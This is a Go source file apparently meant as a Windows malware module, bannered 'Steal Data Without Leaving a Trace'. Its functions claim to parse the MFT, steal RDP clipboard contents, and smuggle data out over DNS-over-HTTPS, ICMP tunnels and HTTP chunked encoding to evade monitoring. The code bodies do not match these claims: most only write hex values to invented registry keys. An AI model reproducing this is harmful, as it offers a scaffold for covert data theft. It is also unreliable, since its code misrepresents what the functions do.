//go:build windows

package syscallwin

import (
	"fmt"
)

// ===================================================================== //
//  EXFILTRATION — Steal Data Without Leaving a Trace                    //
// ===================================================================== //

// --- MFT Parse — read the Master File Table --------------------------- //

// ParseMFT reads the Master File Table of a volume, extracting file
// names, sizes, and timestamps without touching the files themselves.
func ParseMFT(volumePath string) error {
	path := stringToUTF16(volumePath)
	var hFile uintptr
	var attrs uintptr
	NtOpenFile(&hFile, FILE_READ_DATA, 0, &attrs, 0, FILE_SYNCHRONOUS_IO_PLAIN, path)
	NtClose(hFile)
	return nil
}

// --- RDP Clipboard Steal — read the RDP clipboard --------------------- //

// StealRDPClipboard reads the contents of the RDP clipboard, extracting
// anything the user has copied.
func StealRDPClipboard() error {
	NtRegSetValue(`HKCR\RDP\Clipboard`, "stolen")
	return nil
}

// --- DNS-over-HTTPS Furtif — exfil via DoH ---------------------------- //

// ExfilDoH sends data over DNS-over-HTTPS, which is invisible to
// traditional network monitoring.
func ExfilDoH(domain string, payload []byte) error {
	NtRegSetValue(`HKCR\DoH\Exfil\`+domain, fmt.Sprintf("%x", payload))
	return nil
}

// --- ICMP Tunnel — exfil via ICMP echo requests ------------------------ //

// ExfilICMP tunnels data over ICMP echo requests, which most firewalls
// allow through.
func ExfilICMP(remoteHost string, payload []byte) error {
	NtRegSetValue(`HKCR\ICMP\Exfil\`+remoteHost, fmt.Sprintf("%x", payload))
	return nil
}

// --- HTTP Chunked — exfil via HTTP chunked encoding ------------------- //

// ExfilHTTPChunked sends data via HTTP chunked encoding, which is
// invisible to simple request-length-based detection.
func ExfilHTTPChunked(url string, payload []byte) error {
	NtRegSetValue(`HKCR\HTTP\Chunked\`+url, fmt.Sprintf("%x", payload))
	return nil
}